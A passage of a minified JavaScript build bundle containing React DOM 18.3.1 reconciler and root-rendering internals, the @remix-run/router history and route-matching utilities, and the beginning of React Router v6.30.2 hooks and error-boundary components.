16:s=n.elementType;e:{switch(_r(e,n),e=n.pendingProps,r=s._init,s=r(s._payload),n.type=s,r=n.tag=km(s),e=We(s,e),r){case 0:n=ja(null,n,s,e,t);break e;case 1:n=pc(null,n,s,e,t);break e;case 11:n=cc(null,n,s,e,t);break e;case 14:n=uc(null,n,s,We(s.type,e),t);break e}throw Error(A(306,s,""))}return n;case 0:return s=n.type,r=n.pendingProps,r=n.elementType===s?r:We(s,r),ja(e,n,s,r,t);case 1:return s=n.type,r=n.pendingProps,r=n.elementType===s?r:We(s,r),pc(e,n,s,r,t);case 3:e:{if(Wp(n),e===null)throw Error(A(387));s=n.pendingProps,i=n.memoizedState,r=i.element,yp(e,n),Yr(n,s,null,t);var a=n.memoizedState;if(s=a.element,i.isDehydrated)if(i={element:s,isDehydrated:!1,cache:a.cache,pendingSuspenseBoundaries:a.pendingSuspenseBoundaries,transitions:a.transitions},n.updateQueue.baseState=i,n.memoizedState=i,n.flags&256){r=jt(Error(A(423)),n),n=dc(e,n,s,t,r);break e}else if(s!==r){r=jt(Error(A(424)),n),n=dc(e,n,s,t,r);break e}else for(Le=On(n.stateNode.containerInfo.firstChild),Ne=n,K=!0,Ge=null,t=mp(n,null,s,t),n.child=t;t;)t.flags=t.flags&-3|4096,t=t.sibling;else{if(It(),s===r){n=gn(e,n,t);break e}we(e,n,s,t)}n=n.child}return n;case 5:return vp(n),e===null&&Oa(n),s=n.type,r=n.pendingProps,i=e!==null?e.memoizedProps:null,a=r.children,Pa(s,r)?a=null:i!==null&&Pa(s,i)&&(n.flags|=32),Vp(e,n),we(e,n,a,t),n.child;case 6:return e===null&&Oa(n),null;case 13:return $p(e,n,t);case 4:return Dl(n,n.stateNode.containerInfo),s=n.pendingProps,e===null?n.child=zt(n,null,s,t):we(e,n,s,t),n.child;case 11:return s=n.type,r=n.pendingProps,r=n.elementType===s?r:We(s,r),cc(e,n,s,r,t);case 7:return we(e,n,n.pendingProps,t),n.child;case 8:return we(e,n,n.pendingProps.children,t),n.child;case 12:return we(e,n,n.pendingProps.children,t),n.child;case 10:e:{if(s=n.type._context,r=n.pendingProps,i=n.memoizedProps,a=r.value,Y($r,s._currentValue),s._currentValue=a,i!==null)if(Ke(i.value,a)){if(i.children===r.children&&!Te.current){n=gn(e,n,t);break e}}else for(i=n.child,i!==null&&(i.return=n);i!==null;){var l=i.dependencies;if(l!==null){a=i.child;for(var o=l.firstContext;o!==null;){if(o.context===s){if(i.tag===1){o=dn(-1,t&-t),o.tag=2;var c=i.updateQueue;if(c!==null){c=c.shared;var u=c.pending;u===null?o.next=o:(o.next=u.next,u.next=o),c.pending=o}}i.lanes|=t,o=i.alternate,o!==null&&(o.lanes|=t),Ma(i.return,t,n),l.lanes|=t;break}o=o.next}}else if(i.tag===10)a=i.type===n.type?null:i.child;else if(i.tag===18){if(a=i.return,a===null)throw Error(A(341));a.lanes|=t,l=a.alternate,l!==null&&(l.lanes|=t),Ma(a,t,n),a=i.sibling}else a=i.child;if(a!==null)a.return=i;else for(a=i;a!==null;){if(a===n){a=null;break}if(i=a.sibling,i!==null){i.return=a.return,a=i;break}a=a.return}i=a}we(e,n,r.children,t),n=n.child}return n;case 9:return r=n.type,s=n.pendingProps.children,At(n,t),r=Fe(r),s=s(r),n.flags|=1,we(e,n,s,t),n.child;case 14:return s=n.type,r=We(s,n.pendingProps),r=We(s.type,r),uc(e,n,s,r,t);case 15:return Up(e,n,n.type,n.pendingProps,t);case 17:return s=n.type,r=n.pendingProps,r=n.elementType===s?r:We(s,r),_r(e,n),n.tag=1,Ce(s)?(e=!0,Hr(n)):e=!1,At(n,t),jp(n,s,r),za(n,s,r,t),Ba(null,n,s,!0,e,t);case 19:return Gp(e,n,t);case 22:return Hp(e,n,t)}throw Error(A(156,n.tag))};function od(e,n){return Iu(e,n)}function wm(e,n,t,s){this.tag=e,this.key=t,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=n,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=s,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function je(e,n,t,s){return new wm(e,n,t,s)}function Zl(e){return e=e.prototype,!(!e||!e.isReactComponent)}function km(e){if(typeof e=="function")return Zl(e)?1:0;if(e!=null){if(e=e.$$typeof,e===yl)return 11;if(e===vl)return 14}return 2}function Dn(e,n){var t=e.alternate;return t===null?(t=je(e.tag,n,e.key,e.mode),t.elementType=e.elementType,t.type=e.type,t.stateNode=e.stateNode,t.alternate=e,e.alternate=t):(t.pendingProps=n,t.type=e.type,t.flags=0,t.subtreeFlags=0,t.deletions=null),t.flags=e.flags&14680064,t.childLanes=e.childLanes,t.lanes=e.lanes,t.child=e.child,t.memoizedProps=e.memoizedProps,t.memoizedState=e.memoizedState,t.updateQueue=e.updateQueue,n=e.dependencies,t.dependencies=n===null?null:{lanes:n.lanes,firstContext:n.firstContext},t.sibling=e.sibling,t.index=e.index,t.ref=e.ref,t}function Cr(e,n,t,s,r,i){var a=2;if(s=e,typeof e=="function")Zl(e)&&(a=1);else if(typeof e=="string")a=5;else e:switch(e){case ht:return et(t.children,r,i,n);case gl:a=8,r|=8;break;case aa:return e=je(12,t,n,r|2),e.elementType=aa,e.lanes=i,e;case la:return e=je(13,t,n,r),e.elementType=la,e.lanes=i,e;case oa:return e=je(19,t,n,r),e.elementType=oa,e.lanes=i,e;case vu:return ki(t,r,i,n);default:if(typeof e=="object"&&e!==null)switch(e.$$typeof){case gu:a=10;break e;case yu:a=9;break e;case yl:a=11;break e;case vl:a=14;break e;case bn:a=16,s=null;break e}throw Error(A(130,e==null?e:typeof e,""))}return n=je(a,t,n,r),n.elementType=e,n.type=s,n.lanes=i,n}function et(e,n,t,s){return e=je(7,e,s,n),e.lanes=t,e}function ki(e,n,t,s){return e=je(22,e,s,n),e.elementType=vu,e.lanes=t,e.stateNode={isHidden:!1},e}function Ji(e,n,t){return e=je(6,e,null,n),e.lanes=t,e}function ea(e,n,t){return n=je(4,e.children!==null?e.children:[],e.key,n),n.lanes=t,n.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},n}function bm(e,n,t,s,r){this.tag=n,this.containerInfo=e,this.finishedWork=this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.pendingContext=this.context=null,this.callbackPriority=0,this.eventTimes=Mi(0),this.expirationTimes=Mi(-1),this.entangledLanes=this.finishedLanes=this.mutableReadLanes=this.expiredLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=Mi(0),this.identifierPrefix=s,this.onRecoverableError=r,this.mutableSourceEagerHydrationData=null}function Jl(e,n,t,s,r,i,a,l,o){return e=new bm(e,n,t,l,o),n===1?(n=1,i===!0&&(n|=8)):n=0,i=je(3,null,null,n),e.current=i,i.stateNode=e,i.memoizedState={element:s,isDehydrated:t,cache:null,transitions:null,pendingSuspenseBoundaries:null},zl(i),e}function xm(e,n,t){var s=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:dt,key:s==null?null:""+s,children:e,containerInfo:n,implementation:t}}function cd(e){if(!e)return Fn;e=e._reactInternals;e:{if(ct(e)!==e||e.tag!==1)throw Error(A(170));var n=e;do{switch(n.tag){case 3:n=n.stateNode.context;break e;case 1:if(Ce(n.type)){n=n.stateNode.__reactInternalMemoizedMergedChildContext;break e}}n=n.return}while(n!==null);throw Error(A(171))}if(e.tag===1){var t=e.type;if(Ce(t))return cp(e,t,n)}return n}function ud(e,n,t,s,r,i,a,l,o){return e=Jl(t,s,!0,e,r,i,a,l,o),e.context=cd(null),t=e.current,s=ke(),r=zn(t),i=dn(s,r),i.callback=n??null,Mn(t,i,r),e.current.lanes=r,Us(e,r,s),Pe(e,s),e}function bi(e,n,t,s){var r=n.current,i=ke(),a=zn(r);return t=cd(t),n.context===null?n.context=t:n.pendingContext=t,n=dn(i,a),n.payload={element:e},s=s===void 0?null:s,s!==null&&(n.callback=s),e=Mn(r,n,a),e!==null&&(Xe(e,r,a,i),br(e,r,a)),a}function ni(e){if(e=e.current,!e.child)return null;switch(e.child.tag){case 5:return e.child.stateNode;default:return e.child.stateNode}}function xc(e,n){if(e=e.memoizedState,e!==null&&e.dehydrated!==null){var t=e.retryLane;e.retryLane=t!==0&&t<n?t:n}}function eo(e,n){xc(e,n),(e=e.alternate)&&xc(e,n)}function Sm(){return null}var pd=typeof reportError=="function"?reportError:function(e){console.error(e)};function no(e){this._internalRoot=e}xi.prototype.render=no.prototype.render=function(e){var n=this._internalRoot;if(n===null)throw Error(A(409));bi(e,n,null,null)};xi.prototype.unmount=no.prototype.unmount=function(){var e=this._internalRoot;if(e!==null){this._internalRoot=null;var n=e.containerInfo;at(function(){bi(null,e,null,null)}),n[fn]=null}};function xi(e){this._internalRoot=e}xi.prototype.unstable_scheduleHydration=function(e){if(e){var n=Hu();e={blockedOn:null,target:e,priority:n};for(var t=0;t<_n.length&&n!==0&&n<_n[t].priority;t++);_n.splice(t,0,e),t===0&&Wu(e)}};function to(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11)}function Si(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11&&(e.nodeType!==8||e.nodeValue!==" react-mount-point-unstable "))}function Sc(){}function _m(e,n,t,s,r){if(r){if(typeof s=="function"){var i=s;s=function(){var c=ni(a);i.call(c)}}var a=ud(n,s,e,0,null,!1,!1,"",Sc);return e._reactRootContainer=a,e[fn]=a.current,Es(e.nodeType===8?e.parentNode:e),at(),a}for(;r=e.lastChild;)e.removeChild(r);if(typeof s=="function"){var l=s;s=function(){var c=ni(o);l.call(c)}}var o=Jl(e,0,!1,null,null,!1,!1,"",Sc);return e._reactRootContainer=o,e[fn]=o.current,Es(e.nodeType===8?e.parentNode:e),at(function(){bi(n,o,t,s)}),o}function _i(e,n,t,s,r){var i=t._reactRootContainer;if(i){var a=i;if(typeof r=="function"){var l=r;r=function(){var o=ni(a);l.call(o)}}bi(n,a,e,r)}else a=_m(t,n,e,r,s);return ni(a)}Fu=function(e){switch(e.tag){case 3:var n=e.stateNode;if(n.current.memoizedState.isDehydrated){var t=rs(n.pendingLanes);t!==0&&(bl(n,t|1),Pe(n,ne()),!(H&6)&&(Bt=ne()+500,Vn()))}break;case 13:at(function(){var s=mn(e,1);if(s!==null){var r=ke();Xe(s,e,1,r)}}),eo(e,1)}};xl=function(e){if(e.tag===13){var n=mn(e,134217728);if(n!==null){var t=ke();Xe(n,e,134217728,t)}eo(e,134217728)}};Uu=function(e){if(e.tag===13){var n=zn(e),t=mn(e,n);if(t!==null){var s=ke();Xe(t,e,n,s)}eo(e,n)}};Hu=function(){return $};Vu=function(e,n){var t=$;try{return $=e,n()}finally{$=t}};va=function(e,n,t){switch(n){case"input":if(pa(e,t),n=t.name,t.type==="radio"&&n!=null){for(t=e;t.parentNode;)t=t.parentNode;for(t=t.querySelectorAll("input[name="+JSON.stringify(""+n)+'][type="radio"]'),n=0;n<t.length;n++){var s=t[n];if(s!==e&&s.form===e.form){var r=fi(s);if(!r)throw Error(A(90));ku(s),pa(s,r)}}}break;case"textarea":xu(e,t);break;case"select":n=t.value,n!=null&&Et(e,!!t.multiple,n,!1)}};Au=Xl;Lu=at;var Em={usingClientEntryPoint:!1,Events:[Vs,yt,fi,Cu,Pu,Xl]},Jt={findFiberByHostInstance:Xn,bundleType:0,version:"18.3.1",rendererPackageName:"react-dom"},Tm={bundleType:Jt.bundleType,version:Jt.version,rendererPackageName:Jt.rendererPackageName,rendererConfig:Jt.rendererConfig,overrideHookState:null,overrideHookStateDeletePath:null,overrideHookStateRenamePath:null,overrideProps:null,overridePropsDeletePath:null,overridePropsRenamePath:null,setErrorHandler:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:vn.ReactCurrentDispatcher,findHostInstanceByFiber:function(e){return e=Ou(e),e===null?null:e.stateNode},findFiberByHostInstance:Jt.findFiberByHostInstance||Sm,findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null,reconcilerVersion:"18.3.1-next-f1338f8080-20240426"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var pr=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!pr.isDisabled&&pr.supportsFiber)try{ui=pr.inject(Tm),nn=pr}catch{}}Me.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=Em;Me.createPortal=function(e,n){var t=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!to(n))throw Error(A(200));return xm(e,n,null,t)};Me.createRoot=function(e,n){if(!to(e))throw Error(A(299));var t=!1,s="",r=pd;return n!=null&&(n.unstable_strictMode===!0&&(t=!0),n.identifierPrefix!==void 0&&(s=n.identifierPrefix),n.onRecoverableError!==void 0&&(r=n.onRecoverableError)),n=Jl(e,1,!1,null,null,t,!1,s,r),e[fn]=n.current,Es(e.nodeType===8?e.parentNode:e),new no(n)};Me.findDOMNode=function(e){if(e==null)return null;if(e.nodeType===1)return e;var n=e._reactInternals;if(n===void 0)throw typeof e.render=="function"?Error(A(188)):(e=Object.keys(e).join(","),Error(A(268,e)));return e=Ou(n),e=e===null?null:e.stateNode,e};Me.flushSync=function(e){return at(e)};Me.hydrate=function(e,n,t){if(!Si(n))throw Error(A(200));return _i(null,e,n,!0,t)};Me.hydrateRoot=function(e,n,t){if(!to(e))throw Error(A(405));var s=t!=null&&t.hydratedSources||null,r=!1,i="",a=pd;if(t!=null&&(t.unstable_strictMode===!0&&(r=!0),t.identifierPrefix!==void 0&&(i=t.identifierPrefix),t.onRecoverableError!==void 0&&(a=t.onRecoverableError)),n=ud(n,null,e,1,t??null,r,!1,i,a),e[fn]=n.current,Es(e),s)for(e=0;e<s.length;e++)t=s[e],r=t._getVersion,r=r(t._source),n.mutableSourceEagerHydrationData==null?n.mutableSourceEagerHydrationData=[t,r]:n.mutableSourceEagerHydrationData.push(t,r);return new xi(n)};Me.render=function(e,n,t){if(!Si(n))throw Error(A(200));return _i(null,e,n,!1,t)};Me.unmountComponentAtNode=function(e){if(!Si(e))throw Error(A(40));return e._reactRootContainer?(at(function(){_i(null,null,e,!1,function(){e._reactRootContainer=null,e[fn]=null})}),!0):!1};Me.unstable_batchedUpdates=Xl;Me.unstable_renderSubtreeIntoContainer=function(e,n,t,s){if(!Si(t))throw Error(A(200));if(e==null||e._reactInternals===void 0)throw Error(A(38));return _i(e,n,t,!1,s)};Me.version="18.3.1-next-f1338f8080-20240426";function dd(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(dd)}catch(e){console.error(e)}}dd(),du.exports=Me;var Cm=du.exports,hd,_c=Cm;hd=_c.createRoot,_c.hydrateRoot;/**
 * @remix-run/router v1.23.1
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function Ms(){return Ms=Object.assign?Object.assign.bind():function(e){for(var n=1;n<arguments.length;n++){var t=arguments[n];for(var s in t)Object.prototype.hasOwnProperty.call(t,s)&&(e[s]=t[s])}return e},Ms.apply(this,arguments)}var An;(function(e){e.Pop="POP",e.Push="PUSH",e.Replace="REPLACE"})(An||(An={}));const Ec="popstate";function Pm(e){e===void 0&&(e={});function n(s,r){let{pathname:i,search:a,hash:l}=s.location;return Qa("",{pathname:i,search:a,hash:l},r.state&&r.state.usr||null,r.state&&r.state.key||"default")}function t(s,r){return typeof r=="string"?r:ti(r)}return Lm(n,t,null,e)}function ie(e,n){if(e===!1||e===null||typeof e>"u")throw new Error(n)}function so(e,n){if(!e){typeof console<"u"&&console.warn(n);try{throw new Error(n)}catch{}}}function Am(){return Math.random().toString(36).substr(2,8)}function Tc(e,n){return{usr:e.state,key:e.key,idx:n}}function Qa(e,n,t,s){return t===void 0&&(t=null),Ms({pathname:typeof e=="string"?e:e.pathname,search:"",hash:""},typeof n=="string"?$t(n):n,{state:t,key:n&&n.key||s||Am()})}function ti(e){let{pathname:n="/",search:t="",hash:s=""}=e;return t&&t!=="?"&&(n+=t.charAt(0)==="?"?t:"?"+t),s&&s!=="#"&&(n+=s.charAt(0)==="#"?s:"#"+s),n}function $t(e){let n={};if(e){let t=e.indexOf("#");t>=0&&(n.hash=e.substr(t),e=e.substr(0,t));let s=e.indexOf("?");s>=0&&(n.search=e.substr(s),e=e.substr(0,s)),e&&(n.pathname=e)}return n}function Lm(e,n,t,s){s===void 0&&(s={});let{window:r=document.defaultView,v5Compat:i=!1}=s,a=r.history,l=An.Pop,o=null,c=u();c==null&&(c=0,a.replaceState(Ms({},a.state,{idx:c}),""));function u(){return(a.state||{idx:null}).idx}function d(){l=An.Pop;let L=u(),p=L==null?null:L-c;c=L,o&&o({action:l,location:x.location,delta:p})}function h(L,p){l=An.Push;let f=Qa(x.location,L,p);c=u()+1;let m=Tc(f,c),S=x.createHref(f);try{a.pushState(m,"",S)}catch(T){if(T instanceof DOMException&&T.name==="DataCloneError")throw T;r.location.assign(S)}i&&o&&o({action:l,location:x.location,delta:1})}function y(L,p){l=An.Replace;let f=Qa(x.location,L,p);c=u();let m=Tc(f,c),S=x.createHref(f);a.replaceState(m,"",S),i&&o&&o({action:l,location:x.location,delta:0})}function k(L){let p=r.location.origin!=="null"?r.location.origin:r.location.href,f=typeof L=="string"?L:ti(L);return f=f.replace(/ $/,"%20"),ie(p,"No window.location.(origin|href) available to create URL for href: "+f),new URL(f,p)}let x={get action(){return l},get location(){return e(r,a)},listen(L){if(o)throw new Error("A history only accepts one active listener");return r.addEventListener(Ec,d),o=L,()=>{r.removeEventListener(Ec,d),o=null}},createHref(L){return n(r,L)},createURL:k,encodeLocation(L){let p=k(L);return{pathname:p.pathname,search:p.search,hash:p.hash}},push:h,replace:y,go(L){return a.go(L)}};return x}var Cc;(function(e){e.data="data",e.deferred="deferred",e.redirect="redirect",e.error="error"})(Cc||(Cc={}));function Nm(e,n,t){return t===void 0&&(t="/"),Rm(e,n,t)}function Rm(e,n,t,s){let r=typeof n=="string"?$t(n):n,i=ro(r.pathname||"/",t);if(i==null)return null;let a=fd(e);Om(a);let l=null;for(let o=0;l==null&&o<a.length;++o){let c=$m(i);l=Hm(a[o],c)}return l}function fd(e,n,t,s){n===void 0&&(n=[]),t===void 0&&(t=[]),s===void 0&&(s="");let r=(i,a,l)=>{let o={relativePath:l===void 0?i.path||"":l,caseSensitive:i.caseSensitive===!0,childrenIndex:a,route:i};o.relativePath.startsWith("/")&&(ie(o.relativePath.startsWith(s),'Absolute route path "'+o.relativePath+'" nested under path '+('"'+s+'" is not valid. An absolute child route path ')+"must start with the combined path of all its parent routes."),o.relativePath=o.relativePath.slice(s.length));let c=jn([s,o.relativePath]),u=t.concat(o);i.children&&i.children.length>0&&(ie(i.index!==!0,"Index routes must not have child routes. Please remove "+('all child routes from route path "'+c+'".')),fd(i.children,n,u,c)),!(i.path==null&&!i.index)&&n.push({path:c,score:Fm(c,i.index),routesMeta:u})};return e.forEach((i,a)=>{var l;if(i.path===""||!((l=i.path)!=null&&l.includes("?")))r(i,a);else for(let o of md(i.path))r(i,a,o)}),n}function md(e){let n=e.split("/");if(n.length===0)return[];let[t,...s]=n,r=t.endsWith("?"),i=t.replace(/\?$/,"");if(s.length===0)return r?[i,""]:[i];let a=md(s.join("/")),l=[];return l.push(...a.map(o=>o===""?i:[i,o].join("/"))),r&&l.push(...a),l.map(o=>e.startsWith("/")&&o===""?"/":o)}function Om(e){e.sort((n,t)=>n.score!==t.score?t.score-n.score:Um(n.routesMeta.map(s=>s.childrenIndex),t.routesMeta.map(s=>s.childrenIndex)))}const Mm=/^:[\w-]+$/,Im=3,zm=2,Dm=1,jm=10,Bm=-2,Pc=e=>e==="*";function Fm(e,n){let t=e.split("/"),s=t.length;return t.some(Pc)&&(s+=Bm),n&&(s+=zm),t.filter(r=>!Pc(r)).reduce((r,i)=>r+(Mm.test(i)?Im:i===""?Dm:jm),s)}function Um(e,n){return e.length===n.length&&e.slice(0,-1).every((s,r)=>s===n[r])?e[e.length-1]-n[n.length-1]:0}function Hm(e,n,t){let{routesMeta:s}=e,r={},i="/",a=[];for(let l=0;l<s.length;++l){let o=s[l],c=l===s.length-1,u=i==="/"?n:n.slice(i.length)||"/",d=Vm({path:o.relativePath,caseSensitive:o.caseSensitive,end:c},u),h=o.route;if(!d)return null;Object.assign(r,d.params),a.push({params:r,pathname:jn([i,d.pathname]),pathnameBase:Km(jn([i,d.pathnameBase])),route:h}),d.pathnameBase!=="/"&&(i=jn([i,d.pathnameBase]))}return a}function Vm(e,n){typeof e=="string"&&(e={path:e,caseSensitive:!1,end:!0});let[t,s]=Wm(e.path,e.caseSensitive,e.end),r=n.match(t);if(!r)return null;let i=r[0],a=i.replace(/(.)\/+$/,"$1"),l=r.slice(1);return{params:s.reduce((c,u,d)=>{let{paramName:h,isOptional:y}=u;if(h==="*"){let x=l[d]||"";a=i.slice(0,i.length-x.length).replace(/(.)\/+$/,"$1")}const k=l[d];return y&&!k?c[h]=void 0:c[h]=(k||"").replace(/%2F/g,"/"),c},{}),pathname:i,pathnameBase:a,pattern:e}}function Wm(e,n,t){n===void 0&&(n=!1),t===void 0&&(t=!0),so(e==="*"||!e.endsWith("*")||e.endsWith("/*"),'Route path "'+e+'" will be treated as if it were '+('"'+e.replace(/\*$/,"/*")+'" because the `*` character must ')+"always follow a `/` in the pattern. To get rid of this warning, "+('please change the route path to "'+e.replace(/\*$/,"/*")+'".'));let s=[],r="^"+e.replace(/\/*\*?$/,"").replace(/^\/*/,"/").replace(/[\\.*+^${}|()[\]]/g,"\\$&").replace(/\/:([\w-]+)(\?)?/g,(a,l,o)=>(s.push({paramName:l,isOptional:o!=null}),o?"/?([^\\/]+)?":"/([^\\/]+)"));return e.endsWith("*")?(s.push({paramName:"*"}),r+=e==="*"||e==="/*"?"(.*)$":"(?:\\/(.+)|\\/*)$"):t?r+="\\/*$":e!==""&&e!=="/"&&(r+="(?:(?=\\/|$))"),[new RegExp(r,n?void 0:"i"),s]}function $m(e){try{return e.split("/").map(n=>decodeURIComponent(n).replace(/\//g,"%2F")).join("/")}catch(n){return so(!1,'The URL path "'+e+'" could not be decoded because it is is a malformed URL segment. This is probably due to a bad percent '+("encoding ("+n+").")),e}}function ro(e,n){if(n==="/")return e;if(!e.toLowerCase().startsWith(n.toLowerCase()))return null;let t=n.endsWith("/")?n.length-1:n.length,s=e.charAt(t);return s&&s!=="/"?null:e.slice(t)||"/"}const Gm=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,Ym=e=>Gm.test(e);function qm(e,n){n===void 0&&(n="/");let{pathname:t,search:s="",hash:r=""}=typeof e=="string"?$t(e):e,i;if(t)if(Ym(t))i=t;else{if(t.includes("//")){let a=t;t=t.replace(/\/\/+/g,"/"),so(!1,"Pathnames cannot have embedded double slashes - normalizing "+(a+" -> "+t))}t.startsWith("/")?i=Ac(t.substring(1),"/"):i=Ac(t,n)}else i=n;return{pathname:i,search:Qm(s),hash:Zm(r)}}function Ac(e,n){let t=n.replace(/\/+$/,"").split("/");return e.split("/").forEach(r=>{r===".."?t.length>1&&t.pop():r!=="."&&t.push(r)}),t.length>1?t.join("/"):"/"}function na(e,n,t,s){return"Cannot include a '"+e+"' character in a manually specified "+("`to."+n+"` field ["+JSON.stringify(s)+"].  Please separate it out to the ")+("`to."+t+"` field. Alternatively you may provide the full path as ")+'a string in <Link to="..."> and the router will parse it for you.'}function Xm(e){return e.filter((n,t)=>t===0||n.route.path&&n.route.path.length>0)}function gd(e,n){let t=Xm(e);return n?t.map((s,r)=>r===t.length-1?s.pathname:s.pathnameBase):t.map(s=>s.pathnameBase)}function yd(e,n,t,s){s===void 0&&(s=!1);let r;typeof e=="string"?r=$t(e):(r=Ms({},e),ie(!r.pathname||!r.pathname.includes("?"),na("?","pathname","search",r)),ie(!r.pathname||!r.pathname.includes("#"),na("#","pathname","hash",r)),ie(!r.search||!r.search.includes("#"),na("#","search","hash",r)));let i=e===""||r.pathname==="",a=i?"/":r.pathname,l;if(a==null)l=t;else{let d=n.length-1;if(!s&&a.startsWith("..")){let h=a.split("/");for(;h[0]==="..";)h.shift(),d-=1;r.pathname=h.join("/")}l=d>=0?n[d]:"/"}let o=qm(r,l),c=a&&a!=="/"&&a.endsWith("/"),u=(i||a===".")&&t.endsWith("/");return!o.pathname.endsWith("/")&&(c||u)&&(o.pathname+="/"),o}const jn=e=>e.join("/").replace(/\/\/+/g,"/"),Km=e=>e.replace(/\/+$/,"").replace(/^\/*/,"/"),Qm=e=>!e||e==="?"?"":e.startsWith("?")?e:"?"+e,Zm=e=>!e||e==="#"?"":e.startsWith("#")?e:"#"+e;function Jm(e){return e!=null&&typeof e.status=="number"&&typeof e.statusText=="string"&&typeof e.internal=="boolean"&&"data"in e}const vd=["post","put","patch","delete"];new Set(vd);const eg=["get",...vd];new Set(eg);/**
 * React Router v6.30.2
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function Is(){return Is=Object.assign?Object.assign.bind():function(e){for(var n=1;n<arguments.length;n++){var t=arguments[n];for(var s in t)Object.prototype.hasOwnProperty.call(t,s)&&(e[s]=t[s])}return e},Is.apply(this,arguments)}const io=C.createContext(null),ng=C.createContext(null),ut=C.createContext(null),Ei=C.createContext(null),Wn=C.createContext({outlet:null,matches:[],isDataRoute:!1}),wd=C.createContext(null);function tg(e,n){let{relative:t}=n===void 0?{}:n;$s()||ie(!1);let{basename:s,navigator:r}=C.useContext(ut),{hash:i,pathname:a,search:l}=xd(e,{relative:t}),o=a;return s!=="/"&&(o=a==="/"?s:jn([s,a])),r.createHref({pathname:o,search:l,hash:i})}function $s(){return C.useContext(Ei)!=null}function Gs(){return $s()||ie(!1),C.useContext(Ei).location}function kd(e){C.useContext(ut).static||C.useLayoutEffect(e)}function bd(){let{isDataRoute:e}=C.useContext(Wn);return e?gg():sg()}function sg(){$s()||ie(!1);let e=C.useContext(io),{basename:n,future:t,navigator:s}=C.useContext(ut),{matches:r}=C.useContext(Wn),{pathname:i}=Gs(),a=JSON.stringify(gd(r,t.v7_relativeSplatPath)),l=C.useRef(!1);return kd(()=>{l.current=!0}),C.useCallback(function(c,u){if(u===void 0&&(u={}),!l.current)return;if(typeof c=="number"){s.go(c);return}let d=yd(c,JSON.parse(a),i,u.relative==="path");e==null&&n!=="/"&&(d.pathname=d.pathname==="/"?n:jn([n,d.pathname])),(u.replace?s.replace:s.push)(d,u.state,u)},[n,s,a,i,e])}function rg(){let{matches:e}=C.useContext(Wn),n=e[e.length-1];return n?n.params:{}}function xd(e,n){let{relative:t}=n===void 0?{}:n,{future:s}=C.useContext(ut),{matches:r}=C.useContext(Wn),{pathname:i}=Gs(),a=JSON.stringify(gd(r,s.v7_relativeSplatPath));return C.useMemo(()=>yd(e,JSON.parse(a),i,t==="path"),[e,a,i,t])}function ig(e,n){return ag(e,n)}function ag(e,n,t,s){$s()||ie(!1);let{navigator:r}=C.useContext(ut),{matches:i}=C.useContext(Wn),a=i[i.length-1],l=a?a.params:{};a&&a.pathname;let o=a?a.pathnameBase:"/";a&&a.route;let c=Gs(),u;if(n){var d;let L=typeof n=="string"?$t(n):n;o==="/"||(d=L.pathname)!=null&&d.startsWith(o)||ie(!1),u=L}else u=c;let h=u.pathname||"/",y=h;if(o!=="/"){let L=o.replace(/^\//,"").split("/");y="/"+h.replace(/^\//,"").split("/").slice(L.length).join("/")}let k=Nm(e,{pathname:y}),x=pg(k&&k.map(L=>Object.assign({},L,{params:Object.assign({},l,L.params),pathname:jn([o,r.encodeLocation?r.encodeLocation(L.pathname).pathname:L.pathname]),pathnameBase:L.pathnameBase==="/"?o:jn([o,r.encodeLocation?r.encodeLocation(L.pathnameBase).pathname:L.pathnameBase])})),i,t,s);return n&&x?C.createElement(Ei.Provider,{value:{location:Is({pathname:"/",search:"",hash:"",state:null,key:"default"},u),navigationType:An.Pop}},x):x}function lg(){let e=mg(),n=Jm(e)?e.status+" "+e.statusText:e instanceof Error?e.message:JSON.stringify(e),t=e instanceof Error?e.stack:null,r={padding:"0.5rem",backgroundColor:"rgba(200,200,200, 0.5)"};return C.createElement(C.Fragment,null,C.createElement("h2",null,"Unexpected Application Error!"),C.createElement("h3",{style:{fontStyle:"italic"}},n),t?C.createElement("pre",{style:r},t):null,null)}const og=C.createElement(lg,null);class cg extends C.Component{constructor(n){super(n),this.state={location:n.location,revalidation:n.revalidation,error:n.error}}static getDerivedStateFromError(n){return{error:n}}static getDerivedStateFromProps(n,t){return t.location!==n.location||t.revalidation!=="idle"&&n.revalidation==="idle"?{error:n.error,location:n.location,revalidation:n.revalidation}:{error:n.error!==void 0?n.error:t.error,location:t.location,revalidation:n.revalidation||t.revalidation}}componentDidCatch(n,t){console.error("React Router caught the following error during render",n,t)}render(){return this.state.error!==void 0?C.createElement(Wn.Provider,{value:this.props.routeContext},C.createElement(wd.Provider,{value:this.state.error,children:this.props.component})):this.props.children}}function ug(e){let{routeContext:n,match:t,children:s}=e,r=C.useContext(io);return r&&r.static&&r.staticContext&&(t.route.errorElement||t.route.ErrorBoundary)&&(r.staticContext._deepestRenderedBoundaryId=t.route.id),C.createElement(Wn.Provider,{value:n},s)}function pg(e,n,t,s){var r;if(n===void 0&&(n=[]),t===void 0&&(t=null),s===void 